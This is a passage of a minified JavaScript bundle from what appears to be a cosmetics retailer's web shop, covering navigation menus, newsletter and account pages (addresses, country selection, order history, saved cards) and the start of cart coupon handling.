button").removeAttr("tabindex"),r.enableScroll(),l.removeClass("nav-active")}function L(e,t){$(e).each((function(){if($(this).hasClass("visible")){var e=$(this),n=e.find(t),r=n.find("> ul"),i=n.offset().top,a=i-5,o=r.offset().top;o<a?e.addClass("top-gradient"):e.removeClass("top-gradient"),i+n.outerHeight()+10<r[0].scrollHeight+o?e.addClass("bottom-gradient"):e.removeClass("bottom-gradient")}}))}function O(e,t){$(document).find(e).each((function(){var e=$(this),n=e.find(t),r=n.find("> ul"),i=n.offset().top,a=r.offset().top,o=i+n.outerHeight()-26,s=r[0].scrollHeight+a,l=e.find(".js-navigation-content-banner"),c=l.outerHeight();l.length&&s<o&&e.hasClass("visible")?(e.addClass("sticky-content-banner"),116<c?r.css("padding-bottom",c):r.css("padding-bottom","")):l.length&&o<s&&e.hasClass("visible")&&(e.removeClass("sticky-content-banner"),r.css("padding-bottom",""))}))}function N(e){var t=e;if(!t.hasClass("active")){var n=t.parent(".js-nav-mobile-subnav-item").siblings();t.parent(".js-nav-mobile-subnav-item").find(T).length?(t.siblings(T).find(M).addClass("visible"),o.updateImages(t.parent().find(".js-nav-responsive-bg").parent(),!0),n.find(E).hasClass("active")?(t.parents(C).removeClass("first-opening"),n.find(E).removeClass("active"),n.find(T).hide().removeClass("visible").removeClass("slide-in").removeClass("opened"),n.find(M).removeClass("visible"),n.find(w).hide(),n.find(".js-nav-desktop-sublink-flyin").removeClass("flyin"),t.siblings(T).show().addClass("visible").addClass("opened"),t.siblings(T).find(w).show(),L(M,k),O(M,k),setTimeout((function(){t.siblings(T).find(".js-nav-desktop-sublink-flyin").each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)}))}),100)):(t.parents(C).addClass("first-opening"),t.siblings(T).stop().fadeIn(10,(function(){var e=$(this);e.addClass("slide-in"),setTimeout((function(){e.find(w).fadeIn(300),e.addClass("opened"),e.find(".js-nav-desktop-sublink-flyin").each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)}))}),1e3),L(M,k),O(M,k)}))),t.addClass("active")):n.find(E).hasClass("active")&&(e.parents(C).find(_).fadeIn(300),e.parents(C).removeClass("first-opening"),n.find(E).removeClass("active"),n.find(T).hide().removeClass("visible").removeClass("slide-in").removeClass("opened"),n.find(M).removeClass("visible"),n.find(w).hide(),n.find(".js-nav-desktop-sublink-flyin").removeClass("flyin"))}}function D(){$(b).fadeOut(),g.removeClass("selected").addClass("disabled"),$(_).hide(),$(y).removeClass("visible"),v.removeClass("active"),r.enableScroll(),$(T).each((function(){var e=$(this);e.hasClass("opened")&&(e.parents(C).addClass("first-opening"),e.removeClass("slide-in").removeClass("opened").removeClass("visible"),e.find(M).removeClass("visible"),e.find(w).hide(),e.siblings(E).removeClass("active"))})),setTimeout((function(){B.removeClass("flyin"),$(y).stop().fadeOut((function(){g.removeClass("disabled"),$(y).removeClass("opened"),$(T).hide(),$(C).removeClass("first-opening")}))}),1e3)}function R(){window.eventBus.$emit("shouldOpenModal",{resources:{heading:""},paragraphs:[{text:window.Resources.MODAL_LEAVE_CONFIRMATION_BODY}],ctaHolder:{},buttons:[{type:"btn",label:window.Resources.MODAL_LEAVE_CONFIRMATION_BUTTON_NO,eventName:"onPrimaryButtonClick",shouldCloseModal:!0},{type:"btn",label:window.Resources.MODAL_LEAVE_CONFIRMATION_BUTTON_YES,eventName:"shouldProceed",shouldCloseModal:!0}],closeElement:{eventName:"onCloseElementClick",shouldCloseModal:!0},modalLarge:!0,centerOnMobile:!0})}function j(){var e;c.on("click",(function(){var e=$(this);e.hasClass("active")?($("body").removeAttr("style"),$("body").off("touchstart.navigation"),$("body").off("touchmove.navigation"),$("body").off("touchend.navigation"),$(".js-mob-scrollable-container").off("scroll.navigation"),F()):($("html, body").animate({scrollTop:0},100,(function(){r.disableScroll()})),$("body").css({overflow:"hidden"}),$("body").on("touchstart.navigation",(function(){I=!1})),$("body").on("touchmove.navigation",(function(){I=!0})),$("body").on("touchend.navigation",(function(){I=!1,L(h,x)})),$(".js-mob-scrollable-container").on("scroll.navigation",a((function(){L(h,x)}),100)),l.addClass("nav-active"),e.addClass("active"),u.addClass("active"),d.stop().fadeIn(200).attr("aria-hidden","false"),$(window).width()<768&&A.addClass("search-expand"),m.attr("tabindex","-1"),p.parent().each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)})))})),$(document).on("keydown",(function(e){27==e.which&&c.hasClass("active")&&F()})),e=i()?"touchend":"click",$(".js-mobile-nav-next-lvl").on(e,(function(e){if(!1!==e.cancelable&&e.preventDefault(),!I){var t=$(this),n=t.parent();t.addClass("js-selected-category"),n.addClass("flyout"),n.siblings().addClass("flyout"),t.attr("tabindex","-1"),t.closest(".js-mob-scrollable-container").siblings(".js-nav-layer-back").attr("tabindex","-1"),n.siblings().find(".js-mobile-flyin").attr("tabindex","-1"),n.siblings().find("> .js-nav-mobile-sublink").attr("tabindex","-1"),n.siblings().find("> .js-mobile-nav-next-lvl").attr("tabindex","-1"),$(h).removeClass("js-visible"),t.hasClass("js-skip-load-images")||o.updateImages(t.parent().find(".js-nav-responsive-bg").parent(),!0),t.siblings(h).addClass("visible js-visible").attr("aria-hidden","false").fadeIn("fast",(function(){var e=$(this),t=e.find("ul").first().find("> li");e.find(".js-mob-scrollable-container").scrollTop(0),t.each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)})),$(f).length&&($(f).find("li").addClass("flyout"),$(f).find("li a").attr("tabindex","-1")),L(h,x),n.siblings().find(h).hasClass("visible")&&(n.siblings().find(h).removeClass("visible").hide(),n.siblings().find(h).find(".js-nav-mobile-subnav-item").removeClass("flyin").removeClass("flyout"),n.siblings().find(".js-nav-mobile-sublink, .js-nav-layer-back, .js-mobile-nav-next-lvl").removeAttr("tabindex"))}))}})),$(".js-nav-layer-back").on(e,(function(){var e=$(this),t=e.parent(h);t.removeClass("js-visible"),t.find("ul").first().find("> li").removeClass("flyin"),t.removeClass("visible").fadeOut("70",(function(){var t=e.closest("ul"),n=t.parent().find("> ul > li"),r=t.siblings(f);if(t.find(".js-selected-category").removeClass("js-selected-category"),t.find("> .js-nav-mobile-subnav-item").find("> .js-nav-mobile-sublink").removeAttr("tabindex"),t.find("> .js-nav-mobile-subnav-item").find("> .js-mobile-nav-next-lvl").removeAttr("tabindex"),t.parent(".js-mob-scrollable-container").siblings(".js-nav-layer-back").removeAttr("tabindex"),d.find(".js-clicked").length){var i=d.find(".js-clicked"),a=i.closest(h);i.siblings().each((function(e,t){setTimeout((function(){$(t).removeClass("flyout")}),40*e)})),i.siblings().find("> .js-nav-mobile-sublink").removeAttr("tabindex"),i.siblings().find("> .js-mobile-nav-next-lvl").removeAttr("tabindex"),a.find("> .js-nav-layer-back").removeAttr("tabindex"),i.find("button").removeAttr("tabindex").focus(),i.removeClass("js-clicked").removeClass("flyout")}else t.find(".js-mobile-flyin").removeAttr("tabindex"),n.each((function(e,t){setTimeout((function(){$(t).removeClass("flyout")}),40*e)})),r.length&&r.find("li a").removeAttr("tabindex")})).attr("aria-hidden","true"),t.parents(h).addClass("js-visible"),L(h,x)})),c.on("keydown",(function(e){9==e.which&&e.shiftKey&&(e.preventDefault(),$(".js-header-actions").hasClass("search-expand")?$(".js-search-input-toggle").focus():$(".js-header-actions").find("li:last-child a").focus())})),$(".js-open-minicart").on("keydown",(function(e){$(".js-navigation-inner").hasClass("active")&&(9!=e.which||e.shiftKey||(e.preventDefault(),c.focus()))})),$(".js-nav-layer-back").on("keydown",(function(e){9==e.which&&e.shiftKey&&(e.preventDefault(),c.focus())})),d.find("li:last-child").find("> a").on("keydown",(function(e){9!=e.which||e.shiftKey||(e.preventDefault(),$(this).closest("ul").siblings(f).length?$(f).find("li").first().find("a").focus():$(".js-search-input-field").focus())})),g.off("click"),g.on("click",(function(){var e=$(this),t=!g.hasClass("selected"),n=e.siblings(y),i=e.parent().siblings(".js-desktop-nav-item").find(y);v.hasClass("copied-links")||(v.addClass("copied-links"),v.find(".js-nav-link-to-be-copied").each((function(){var e=$(this),t=e.parent(".js-nav-mobile-sublink"),n=e.text(),r=t.attr("href"),i=$(".js-nav-content-links-placeholder").html();t.parent().append(i),t.siblings(".js-nav-desktop-second-layer").find(".js-nav-content-link-copied").text(n),t.siblings(".js-nav-desktop-second-layer").find(".js-nav-content-link-copied").parents(".js-nav-desktop-tab").attr("href",r)}))),e.hasClass("selected")||(t?(e.addClass("selected"),v.addClass("active"),$(b).fadeIn(),r.disableScroll(),n.stop().fadeIn(50,(function(){n.addClass("visible"),setTimeout((function(){n.find(E).each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)})),n.find(_).stop().fadeIn(1e3)}),600),setTimeout((function(){n.addClass("opened")}),800),L(y,S)}))):(g.removeClass("selected"),e.addClass("selected"),i.hide().removeClass("visible").removeClass("opened"),i.find(E).removeClass("flyin"),i.find(_).hide(),i.find(b).hide(),n.show().addClass("visible").addClass("opened"),n.find(_).show(),n.find(b).show(),setTimeout((function(){n.find(E).each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)}))}),400),L(y,S),$(T).each((function(){var e=$(this);e.hasClass("opened")&&(e.hide(),$(C).removeClass("first-opening"),e.removeClass("slide-in").removeClass("opened").removeClass("visible"),e.find(M).removeClass("visible"),e.find(w).hide(),e.siblings(E).removeClass("active"),e.find(".js-nav-desktop-sublink-flyin").removeClass("flyin"))}))))})),$(".js-nav-desktop-subbutton").on("click",(function(){N($(this))})),$(".js-nav-desktop-sublink").on("mouseenter",(function(){N($(this))})),$(".js-nav-mobile-sublink").each((function(){var e=$(this);e.hasClass("js-nav-desktop-subbutton")||e.hasClass("js-nav-desktop-sublink")||e.on("click mouseenter",(function(){N(e)}))})),$(_).on("click",(function(){D()})),$(document).on("click",w,(function(){var e,t,n,r;e=$(this),n=(t=e).parents(C),r=t.parents(T),n.addClass("first-opening"),t.hide(),t.parents(M).removeClass("visible"),r.removeClass("visible").removeClass("slide-in"),r.siblings(E).removeClass("active"),r.find(".js-nav-desktop-sublink-flyin").removeClass("flyin"),n.find(E).addClass("disabled"),setTimeout((function(){n.find(_).fadeIn(400)}),200),setTimeout((function(){r.hide(),t.parents(".js-desktop-nav-item").find(T).removeClass("opened"),n.removeClass("first-opening"),n.find(E).removeClass("disabled")}),1e3)})),$(document).on("keydown",(function(e){27==e.which&&v.hasClass("active")&&D()})),g.on("keydown",(function(e){9==e.which&&!e.shiftKey&&v.hasClass("active")&&$(this).parent().is(":last-child")&&!$(this).hasClass("selected")?(e.preventDefault(),$(this).parent().siblings(".js-desktop-nav-item:first-child").find(".js-nav-desktop-item-link").focus()):9==e.which&&e.shiftKey&&v.hasClass("active")&&$(this).parent().is(":first-child")&&(e.preventDefault(),$(this).parent().siblings(".js-desktop-nav-item:last-child").find(".js-nav-desktop-item-link").focus())})),$(_).on("keydown",(function(e){9==e.which&&!e.shiftKey&&$(this).parents(".js-desktop-nav-item").is(":last-child")&&(e.preventDefault(),$(this).parents(".js-desktop-nav-item").siblings(".js-desktop-nav-item:first-child").find(".js-nav-desktop-item-link").focus())})),$(".js-nav-desktop-sublink").on("keydown",(function(e){13==e.which&&(e.preventDefault(),N($(this)))})),$(".js-desktop-scrollable-subcontainer").find("li:last-child .js-nav-desktop-tab").on("keydown",(function(e){9!=e.which||e.shiftKey||(e.preventDefault(),$(this).parents(M).find(w).focus())})),$(w).on("keydown",(function(e){9==e.which&&e.shiftKey&&(e.preventDefault(),$(this).siblings(".js-desktop-scrollable-subcontainer").find("li:last-child .js-nav-desktop-tab").focus())})),$(".js-navigation-banner-simple").find("button").on("click",(function(){if(v.hasClass("active"))v.find(".js-nav-collection-button").click();else{var e=$(this),t=e.closest("li"),n=d.find(".js-nav-collection-button").siblings(h);t.addClass("flyout").addClass("js-clicked"),t.siblings().addClass("flyout"),e.attr("tabindex","-1"),e.closest(".js-mob-scrollable-container").siblings(".js-nav-layer-back").attr("tabindex","-1"),t.siblings().find(".js-mobile-flyin").attr("tabindex","-1"),t.siblings().find("> .js-nav-mobile-sublink").attr("tabindex","-1"),t.siblings().find("> .js-mobile-nav-next-lvl").attr("tabindex","-1"),$(h).removeClass("js-visible"),o.updateImages(n.parent().find(".js-nav-responsive-bg").parent()),n.addClass("visible").addClass("js-visible").attr("aria-hidden","false").fadeIn("fast",(function(){$(this).find("ul").first().find("> li").each((function(e,t){setTimeout((function(){$(t).addClass("flyin")}),40*e)})),L(h,x)}))}})),$(".js-desktop-scrollable-container").on("scroll",(function(){L(y,S)})),$(".js-desktop-scrollable-subcontainer").on("scroll",(function(){L(M,k)})),$(window).on("resize",(function(){L(M,k),O(M,k)})),$(document).on("click",".js-nav-desktop-subpanel-narow",(function(e){var t=$(this).children("a")[0].href.split("#");if(t[1]){e.stopPropagation(),F(),D();var n=$(".js-product-grid-block"),r=document.querySelector("[data-anchor-id="+t[1]+"]");n&&r&&(s.changeTab(r),$("html, body").animate({scrollTop:n.offset().top},800))}})),U()}function U(){if(0<$(P).length){var e=$(P),t=null;e.each((function(e,n){var r=$(n);t=t||r.data("url"),r.off("click").on("click",R)})),window.eventBus.$on("shouldProceed",(function(){location.href=t||"/"}))}}var z={init:function(){j()},initNavigationToMainSite:U,updateNavigationLinksOnAddToCart:function(e){var t=$("a.js-navigation-redirectbycart");if(0<t.length)for(var n=0;n<t.length;n++){var r=t[n],i=e?$(r).data("redirecturl"):$(r).data("originalurl");r.setAttribute("href",i)}}};t.exports=z},{"./dam/dam-helper":430,"./modules/helpers/debounce":476,"./modules/helpers/isTouchDevice":491,"./modules/helpers/scroll":493,"./product-filter":592}],533:[function(e,t,n){var r=e("lodash"),i=e("./modules/ajax"),a=e("./rituals-form-helper"),o=e("./recaptchaConfig"),s={newsletterSubscribeForm:$(".newsletter-subscribe-form"),stores:[]};n.init=function(){c((function(e){e&&null!==e&&r.each(e,(function(e){var t={};t.value=e.name,t.ID=e.ID,t.label=e.name,t.storeNumber=e.storeNumber,s.stores.push(t)})),$('input[id$="_favoriteStoreSearch"]').autocomplete({source:s.stores,minLength:3,select:function(e,t){l(e,t)}}).bind("keyup",(function(){$('input[id$="_favoriteStoreID"]').val(""),$(this).autocomplete("search")}))})),a.init(),o.defaultInitializationForFormById("newsletterSubscriptionForm")};var l=function(e,t){var n=t.item;$('input[id$="_favoriteStoreID"]').val(n.storeNumber)},c=function(e){i.getJson({url:Urls.getStoresBasicData,dataType:"json",callback:e})}},{"./modules/ajax":470,"./recaptchaConfig":603,"./rituals-form-helper":606,lodash:219}],534:[function(e,t,n){var r={title:"",type:"",params:e("./modules/util/getQueryStringParams")(window.location.search.substr(1)),redirect:function(e){setTimeout((function(){window.location.href=e}),0)},refresh:function(){setTimeout((function(){window.location.assign(window.location.href)}),500)}};t.exports=r},{"./modules/util/getQueryStringParams":509}],535:[function(e,t,n){var r=e("../modules/ajax"),i=e("../modules/helpers/isSmallView"),a=e("../modules/helpers/scroll"),o=e("../giftcert"),s=e("../tooltip"),l=e("../modules/util/appendParamToURL"),c=e("../modules/util/appendParamsToUrl"),u=e("../modules/util/setDeleteConfirmation"),d=e("../modules/util/getScreenBreakpointSize"),p=e("../modules/util/getQueryParameter"),h=e("../flyout"),f=e("../dialog"),A=e("../page"),m=e("../login"),v=e("../validator"),g=e("./registration"),y=e("../prefill-address"),b=e("../modules/google"),_=e("../product-tile"),w=e("../rituals-styles"),C=e("../rituals-form-helper"),x=e("../select-custom"),S=e("./customerbarcode"),k=e("../dam/dam-helper"),M=e("./order-history");function B(){f.open({target:$(".js-country-select-dialog"),options:{modal:!0,dialogClass:"country-selector-dialog account-country-dialog",minHeight:0,position:{my:"top",at:"top+15%",of:window},open:function(){var e=$(".js-country-select-dialog"),t=$(".js-modal-overlay");t.show(),e.addClass("open"),a.disableScroll();var n=$(".js-dialog-title").html();$("span.ui-dialog-title").append('<h3 class="title">'+n+"</h3>"),$("span.ui-dialog-title").html((function(e,t){return t.replace(/&nbsp;/g,"")}));var r=$(".js-close-popup-text").html();$(".ui-dialog-titlebar-close").attr("aria-label",r),$(document).one("click",".ui-dialog-titlebar-close, .ui-widget-overlay, .js-close-dialog, .js-modal-overlay",(function(n){n.preventDefault(),e.dialog("close").removeClass("open"),t.hide(),a.enableScroll()})),$(document).one("click",".js-redirect-locale",(function(e){e.preventDefault();var t=e.target,n=$(t).attr("href");window.location.href=n})),$(document).on("keydown",(function(n){27==n.which&&e.hasClass("open")&&(e.dialog("close").removeClass("open"),t.hide(),a.enableScroll())}))},autoOpen:!0}})}function E(e){h.load({url:e,open:function(){$(".js-generic-flyout").addClass("address-flyout js-address-flyout");var e,t=0<$(".js-address-flyout-inner .js-close-flyout").length,n=$(".js-generic-flyout").find(".js-custom-select");t||$(".js-address-flyout").find(".js-close-flyout").appendTo(".js-address-flyout-inner"),function(){var e=$("#edit-address-form");e.find('input[name="format"]').remove(),s.init(),v.init(),"US"===$("[id$=_country]").val()&&($("[id$=_postal]").on("blur keydown",b.places.setStateFromPostalCode),x.init(),b.places.setStateIDDataForPostalCode()),e.on("click",".js-apply-button",(function(t){if(t.preventDefault(),!e.valid())return!1;var n=l(e.attr("action"),"format","ajax"),r=e.find(".js-apply-button").attr("name"),i={url:n,data:e.serialize()+"&"+r+"=x",type:"POST"};$.ajax(i).done((function(e){if("string"!=typeof e)if(e.success)h.closeFlyouts(),$(".js-account-menu-item").removeClass("active"),L(Urls.accountOverview);else{if(!e.error)return $(".js-address_error").val(e.message),$(".js-address_error").show(),!1;A.redirect(Urls.csrffailed)}else $("#dialog-container").html(e),R.init(),s.init()}))})).on("click",".cancel-button, .close-button",(function(e){e.preventDefault(),h.closeFlyouts()})).on("click",".delete-button",(function(t){if(t.preventDefault(),window.confirm(String.format(Resources.CONFIRM_DELETE,Resources.TITLE_ADDRESS))){var n=c(Urls.deleteAddress,{AddressID:e.find("#addressid").val(),format:"ajax"});$.ajax({url:n,method:"POST",dataType:"json"}).done((function(e){if("ok"===e.status.toLowerCase())h.closeFlyouts(),A.refresh();else{if(0<e.message.length)return $(".js-address_error").val(e.message),$(".js-address_error").show(),!1;h.closeFlyouts(),A.refresh()}}))}})),function(){if("hk"===$("[id$=_country]").val().toLowerCase()){var e={city:$('input[name="preselected-city"]').val(),district:$('input[name="preselected-district"]').val(),subdistrict:$('input[name="preselected-subdistrict"]').val()},t=$("#dwfrm_profile_address_city"),n=$("#dwfrm_profile_address_district"),r=$("#dwfrm_profile_address_subdistrict");t&&n&&r&&C.initTownDistrictFields(t,n,r,e)}}()}(),b.places.init(),w.initInputStyles(),n.length&&(x.init(),n.each((function(){$(this).parents(".selectric-js-custom-select").length||i()||$(this).attr("tabindex","-1")}))),$(".js-account-address-list").find("input:not(.selectric-input ):first").focus(),e=".js-address-flyout .js-close-flyout",$(document).on("keydown",e,(function(e){9!=e.which||e.shiftKey?9==e.which&&e.shiftKey&&(e.preventDefault(),$(".js-account-address-list .js-apply-button").focus()):(e.preventDefault(),$(".js-account-address-list").find("input").first().focus())})),$(document).on("keydown",".js-address-flyout input:first",(function(t){9==t.which&&t.shiftKey&&(t.preventDefault(),$(e).focus())}))},close:function(){$(document).find(".js-triggered-flyout").focus().removeClass("js-triggered-flyout")}})}function T(){if($(".js-newsletter_country_select").val($("#currentCountry").val()),I(),F(),"true"==$("#countryChanged").val()){var e=$("#currentCountry").val(),t=$("#currentLanguage").val();window.location.href.includes($("#currentCountry").val().toLowerCase())||($("html, body").scrollTop(0),$.ajax({url:Urls.addressEditGetCountrySelector,data:{addressCountryCode:e,newsletterPage:!0,languageCode:t},type:"POST",success:function(e){$(".js-country-selector-wrapper").html(e),B()}}))}$(".js-newsletter_country_select").on("change",(function(){var e=$(".js-newsletter_country_select").val(),t=$("#currentCountry").val();if(I(),F(),e.toLowerCase()===t.toLowerCase())return $(".policyCheckbox").hide(),void $(".btn--submit").prop("disabled",!1);$(".policyCheckbox").show(),$("#dwfrm_profile_newsletter_acceptedPolicy").prop("checked",!1),$(".btn--submit").prop("disabled",!0)})),$(".js-newsletter_language_select").on("change",(function(){F()})),$("#dwfrm_profile_newsletter_acceptedPolicy").on("change",(function(){this.checked?$(".btn--submit").prop("disabled",!1):$(".btn--submit").prop("disabled",!0)}))}function P(){var e=$("#RegistrationForm input[id$=addNifNumber]"),t=$("#RegistrationForm").find("input[id$=nifNumber]").parent(),n=$("#RegistrationForm").find("input[id$=nifNumber]");e.length&&(n.val()?(e.prop("checked",!0),t.css("display","block")):(e.prop("checked",!1),t.css("display","none")),e.on("change",(function(){$(this).is(":checked")?t.css("display","block"):t.css("display","none")})))}function I(){var e=$(".js-newsletter_country_select").find("option:selected").data("locales"),t=$(".js-newsletter_language_select");e&&($("option",t).remove(),e.forEach((function(e){var n=$("<option>").attr("url",e.url).attr("label",e.label).attr("flag",e.flagImage).attr("is-default",e.isDefault).val(e.value).text(e.label);e.isSelected&&n.attr("selected","selected"),t.append(n)})),t.find("option:selected")||t.find("option[is-default=true]").attr("selected","selected"))}function F(){$(".js-newsletter_country_select").css({backgroundImage:'url("'+$(".js-newsletter_country_select").find("option:selected").attr("flag")+'")'}),$(".js-newsletter_language_select").css({backgroundImage:'url("'+$(".js-newsletter_language_select").find("option:selected").attr("flag")+'")'})}function L(e){var t=$(".js-content-wrapper");r.load({url:e,target:t,callback:function(t){t.includes("loginajax.isml")&&window.location.replace(Urls.getLoginPage);var n=$(window).width(),r=d(n),a=$(".js-account-form-personal").find(".js-custom-select");"small"===r?O():a.length&&!a.parent(".selectric-hide-select").length&&(a.selectric(),i()||a.attr("tabindex","-1")),window.history.replaceState({},"",e),v.init(),C.initializeDataMask(),e.includes("order-history")&&M.init(),e.includes("newsletter-subscriptions")&&T(),e.includes("edit-profile")&&P(),$("#js-loyalty-image").length&&S.init()}})}function O(){var e=$(".js-footer"),t=$(".js-page-content"),n=$(".js-account-right-content"),r="right-content-active";if(t.hasClass(r)&&!t.hasClass("no-scrolling"))e.removeClass("fixed"),t.removeClass(r),window.scrollTo(0,0),t.css({left:"0"}),t.on("webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend",(function(e){$(e.target).is(this)&&(n.hide(),$(this).removeClass(r),$(this).off("webkitTransitionEnd transitionend msTransitionEnd oTransitionEnd"))}));else if(t.hasClass("no-scrolling"))t.removeClass("no-scrolling"),w.initInputStyles();else if(!t.hasClass("no-scrolling")&&(e.addClass("fixed"),0<n.length)){n.show();var i=n.offset().left;t.css({left:-i}),t.on("webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend",(function(e){$(e.target).is(this)&&($(this).addClass(r),$(this).off("webkitTransitionEnd transitionend msTransitionEnd oTransitionEnd"),N())}))}}function N(){p(window.location.href,"welcomeBack")&&($(".js-new-password-confirmation").addClass("open"),$(".js-modal-overlay").fadeIn(),$(".js-new-password-confirmation").find(".js-new-password-reset").focus(),$(".js-new-password-confirmation").find(".js-new-password-close, .js-new-password-reset").attr("tabindex","0"))}function D(){!function(){$("body").on("click",".js-account-menu-item, .js-overview-item",(function(e){e.preventDefault();var t=!0;if($(this).data("confirmPageChange")&&(t=confirm(Resources.CONFIRM_LEAVE_REGISTRATION)),t){$(this).removeData("confirmPageChange"),$(".js-account-menu-item").removeClass("active"),$(this).addClass("active"),L($(this).attr("href")||$(this).data("href"));var n=$(window).width();if("small"===d(n)&&$(this).data("href")){$(".js-page-content").addClass("no-scrolling");var r=$(this).data("href");$('.js-account-menu-item[href="'+r+'"]').addClass("active").click()}}setTimeout((function(){w.initInputStyles()}),400)})),$("body").on("click",".js-back-to-menu",(function(){"small"===t&&window.location.href!==Urls.accountOverview&&($(".js-account-menu-item").removeClass("active"),O()),window.location.href===Urls.accountOverview&&O()})),$("body").on("click",".js-go-to-overview",(function(e){e.preventDefault(),$(".js-account-menu-item").removeClass("active"),L(Urls.accountOverview)})),$("body").on("click",".js-account-order-pages a",(function(e){e.preventDefault();var t=$(this).attr("href"),n=$(".js-content-wrapper");r.load({url:t,target:n,callback:function(){window.history.replaceState({},"",t);var e=$(".js-header").outerHeight()+2;$("html, body").animate({scrollTop:$("body").offset().top+e},800)}})}));var e=$(window).width(),t=d(e);"small"===t&&window.location.href!==Urls.accountOverview&&O()}(),function(){function e(e){var t=$(e),n=t.find(".js-order-details-dropdown");n.is(":hidden")?(t.addClass("active"),n.slideDown("slow"),k.updateImages(n)):(t.removeClass("active"),n.slideUp("slow"))}$("body").on("click",".js-order-block",(function(){e(this)})),$("body").on("keydown",".js-order-block",(function(t){13!=t.which&&32!=t.which||e(this)})),$("body").on("click",".js-order-details-dropdown",(function(e){e.stopPropagation()}))}(),$(document).on("click",".js-address-edit",(function(e){e.preventDefault();var t=$(this).parent(),n=t.data("country-code"),r=t.data("address-country-code");n&&n!=r?($("html, body").scrollTop(0),$.ajax({url:Urls.addressEditGetCountrySelector,data:{addressCountryCode:r},type:"POST",success:function(e){$(".js-country-selector-wrapper").html(e),B()}})):($(this).addClass("js-triggered-flyout"),E(this.href))})).on("click",".js-address-create",(function(e){e.preventDefault(),$(this).addClass("js-triggered-flyout"),E(this.href)})).on("click",".js-address-delete",(function(e){e.preventDefault(),window.confirm(String.format(Resources.CONFIRM_DELETE,Resources.TITLE_ADDRESS))&&$.ajax({url:l($(this).attr("href"),"format","ajax"),dataType:"json"}).done((function(e){if("ok"===e.status.toLowerCase())A.redirect(Urls.addressesList);else{if(0<e.message.length)return $(".js-address_error").val(e.message),$(".js-address_error").show(),!1;A.refresh()}}))})),function(){$(".add-card").on("click",(function(e){e.preventDefault(),h.load({url:$(e.target).attr("href"),open:function(){}})}));var e=$(".payment-list");0!==e.length&&(u(e,String.format(Resources.CONFIRM_DELETE,Resources.TITLE_CREDITCARD)),$('form[name="payment-remove"]').on("submit",(function(e){e.preventDefault();var t=$(this).find(".delete");$("<input/>").attr({type:"hidden",name:t.attr("name"),value:t.attr("value")||"delete card"}).appendTo($(this));var n=$(this).serialize();$.ajax({type:"POST",url:$(this).attr("action"),data:n}).done((function(){A.redirect(Urls.paymentsList)}))})))}(),T(),P(),m.init(),g.init(),767<$(window).width()&&N()}var R={init:function(){D(),o.init(),y.init(),S.init(),_.init(),C.init(),M.init()},initCartLogin:function(){m.init()}};t.exports=R},{"../dam/dam-helper":430,"../dialog":433,"../flyout":447,"../giftcert":451,"../login":464,"../modules/ajax":470,"../modules/google":474,"../modules/helpers/isSmallView":487,"../modules/helpers/scroll":493,"../modules/util/appendParamToURL":496,"../modules/util/appendParamsToUrl":497,"../modules/util/getQueryParameter":507,"../modules/util/getScreenBreakpointSize":510,"../modules/util/setDeleteConfirmation":525,"../page":534,"../prefill-address":590,"../product-tile":596,"../rituals-form-helper":606,"../rituals-styles":608,"../select-custom":612,"../tooltip":623,"../validator":624,"./customerbarcode":552,"./order-history":559,"./registration":579}],536:[function(e,t,n){var r=e("../bonus-products-view"),i=e("./product/quantity-block"),a=e("./checkout/storeMissingStockWarning"),o=e("./checkout/taxFreeThresholdPassedWarning"),s=e("../storeinventory/cart"),l=e("../page"),c=e("../giftwrap"),u=e("../product-tile"),d=e("../toaster"),p=e("../modules/ajax"),h=e("../validator"),f=e("../modules/util/isMobile"),A=e("./checkout/shipping"),m=e("../modules/google").tagManager,v=e("../modules/helpers/isInViewport"),g=e("../modules/helpers/isSmallView"),y=e("../dialog"),b=e("./personalisedgifting/pgCartUtils"),_=e("../rituals-form-helper"),w=e("../modules/google").places,C=e("../modules/util/getCountryFromLocaleCookie"),x=e("../modules/util/isMobileOrTabletWidth"),S=e("../dam/dam-helper"),k=e("./cart/cartPostalCode"),M=!1;function B(){var e=$(".js-option-radio:checked");return e.length?e.data("delivery-method-type"):"unknown"}function E(e){$(".js-order-totals .js-order-value").text(e.totalPrice),$(".js-order-totals .js-order-subtotal-value").text(e.subtotalPrice),$(".js-checkout-sticky-bar .js-sticky-price-container .order-total-amount").text(e.shippingPrice),e.shippingPrice&&$(".js-shipping-price").text(e.shippingPrice),e&&($(".js-totals-selected-shipping-option").text(e.resource),$(".js-search-by-postalcode-title").text(e.postalCodeButtonTitle));var t=N(e.exclusionResult),n=$(".js-cart-action-checkout button");t.enableCheckout?n.removeClass("btn--disabled").removeAttr("disabled"):n.addClass("btn--disabled").attr("disabled",!0)}function T(){$(".js-cart-coupon-code").slideDown(0,{start:function(){$(".js-cart-coupon-code").css({display:"flex"})}})}function P(){var e=$(".js-coupon-form"),t={url:e.attr("action"),data:e.serialize()+"&dwfrm_cart_addCoupon=addCoupon",type:"POST",success:function(e){var t,n=function(e){var t=$(e).find(".cartcoupon"),n=$(e).find(".js-cart-addcoupon-error-message");if(0<t.length&&0==n.length){var r=t.last().find(".value")[0].innerText.trim();m.pushAddCouponValid(r)}return 0<n.length}(e);if(!n&&"true"===$(e).find(".js-has-coupon-excluded-and-regular-products").text())return t=e,window.eventBus.$on("couponApplyConfirmed",I),window.eventBus.$on("couponApplyCanceled",F),void window.eventBus.$emit("shouldOpenModal",{resources:{heading:Resources.COUPON_PARTIALLY_APPLIED_POPUP_HEADING},paragraphs:[{text:Resources.COUPON_PARTIALLY_APPLIED_POPUP_TEXT}],ctaHolder:{},buttons:[{type:"btn",label:Resources.COUPON_PARTIALLY_APPLIED_POPUP_CONFIRMED,eventName:"couponApplyConfirmed",data:t,shouldCloseModal:!0},{type:"btn 